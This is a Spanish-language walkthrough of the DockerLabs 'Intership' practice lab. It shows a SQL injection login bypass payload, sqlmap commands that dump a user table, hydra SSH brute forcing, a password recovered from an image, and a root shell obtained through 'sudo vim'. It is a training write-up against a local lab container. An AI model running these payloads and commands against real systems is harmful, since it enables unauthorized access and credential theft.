---
title: "DockerLabs - Intership"
difficulty: "Fácil"
source: "DockerLabs"
status: "done"
date: "2026-07-21"
---

Laboratorio para practicar inyección SQL, fuerza bruta SSH y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh intership.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

**Resultados:**
- `22/tcp` — SSH
- `80/tcp` — Apache httpd

Añadir dominio a `/etc/hosts`:
```
172.17.0.2  gatekeeperhr.com
```

## Explotación

### 1. Inyección SQL — Login web

El formulario de login envía credenciales como JSON. Vulnerable a SQLi clásico con bypass de autenticación:

```
http://172.17.0.2/?username=admin'+OR+'1'='1&password=admin
```

Acceso conseguido al panel **GateKeeper HR** (portal de Recursos Humanos).

### 2. Enumeración web

```bash
gobuster dir -u gatekeeperhr.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak
```

Directorio `/spam` — comentario HTML con texto ROT13:

```
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```

Decodificado:

```bash
echo "Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3'" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# La contraseña de uno de los pasantes es 'purpl3'
```

**Password encontrada:** `purpl3`

### 3. Extracción de usuarios via SQLmap

```bash
sqlmap -u "http://gatekeeperhr.com/lab/login.php" \
  --data='{"username":"admin*","password":"admin"}' \
  --dbs --level=5 --risk=3 \
  -H "Content-Type: application/json" \
  --ignore-code=401 --threads=5
```

Base de datos: `gatekeeperhr`. Tablas: `employees`, `hr_users`.

```bash
sqlmap -u "http://gatekeeperhr.com/lab/login.php" \
  --data='{"username":"admin*","password":"admin"}' \
  -D gatekeeperhr -T hr_users --dump \
  -H "Content-Type: application/json" \
  --ignore-code=401 --threads=5
```

Usuarios extraídos:
- `mariana:sunshine`
- `jorge:qwerty`

El panel `employees` muestra dos pasantes en "Pasantia IT": **Pedro Ramirez** y **Valentina Gomez**.

### 4. Acceso SSH — pedro

```bash
# Crear wordlist con nombres del panel
hydra -L users.txt -p purpl3 ssh://172.17.0.2 -t 50 -f
```

**Credenciales:** `pedro:purpl3`

## Escalada de privilegios

### pedro → valentina (esteganografía)

```bash
find / -user valentina 2>/dev/null
# /home/valentina/profile_picture.jpeg
```

```bash
scp pedro@172.17.0.2:/home/valentina/profile_picture.jpeg /tmp/
strings /tmp/profile_picture.jpeg | tail -20
# mag1ck
```

**Credenciales:** `valentina:mag1ck`

### valentina → root (sudo vim)

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/bash'
whoami
# root
```
